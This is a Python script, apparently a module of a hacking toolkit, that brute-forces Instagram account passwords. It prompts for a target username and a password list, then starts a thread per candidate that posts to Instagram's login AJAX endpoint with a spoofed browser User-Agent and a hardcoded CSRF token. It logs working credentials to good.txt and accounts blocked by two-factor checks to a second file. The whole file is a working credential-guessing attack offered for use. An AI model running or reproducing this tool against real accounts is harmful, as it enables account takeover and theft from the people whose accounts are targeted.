from __future__ import absolute_import
from __future__ import print_function
import requests, sys, threading, time, os, random
from random import randint
from six.moves import input

CheckVersion = str (sys.version)
import re
from datetime import datetime

class brute (object):
    def __init__(self):

        try:
            user=input("\033[4mpsf\033[0m set(\033[91mbrute/username\033[0m) > ")
            passlist = input ("\033[4mpsf\033[0m set(\033[91mbrute/passwd/dir\033[0m) > ")
            print("\nTarget Username/Email Id: ",user)
            print("\nTrying Password list from:", passlist)

        except:
            print ('')
            sys.exit ()

        with open (passlist, 'r') as x:
            passlistlist = x.read ().splitlines ()
        thread = []
        self.Coutprox = 0
        for passlist in passlistlist:
            password = passlist.split (':')[0]
            t = threading.Thread (target=self.New_Br, args=(user, password))
            t.start ()
            thread.append (t)
            time.sleep (0.9)
        for j in thread:
            j.join ()

    def cls(self):
        linux = 'clear'
        windows = 'cls'
        os.system ([linux, windows][os.name == 'nt'])

    def New_Br(self, user, pwd):
        link = 'https://www.instagram.com/accounts/login/'
        login_url = 'https://www.instagram.com/accounts/login/ajax/'

        time = int (datetime.now ().timestamp ())

        payload = {
            'username': user,
            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{time}:{pwd}',
            'queryParams': {},
            'optIntoOneTap': 'false'
        }

        with requests.Session () as s:
            r = s.get (link)
            r = s.post (login_url, data=payload, headers={
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36",
                "X-Requested-With": "XMLHttpRequest",
                "Referer": "https://www.instagram.com/accounts/login/",
                "x-csrftoken": 'ZxKmz4hXp6XKmTPg9lzgYxXN4sFr2pzo'
            })
            print (f'Username: {user}  Trying Password: {pwd}')

            if 'checkpoint_url' in r.text:
                print (('' + user + ':' + pwd + ' : Password is found'))
                with open ('good.txt', 'a') as x:
                    x.write (user + ':' + pwd + '\n')
            elif 'two_factor_required' in r.text:
                print (('' + user + ':' + pwd + ' : Authentication Required. '))
                with open ('results_NeedVerfiy.txt', 'a') as x:
                    x.write (user + ':' + pwd + '\n')


brute()
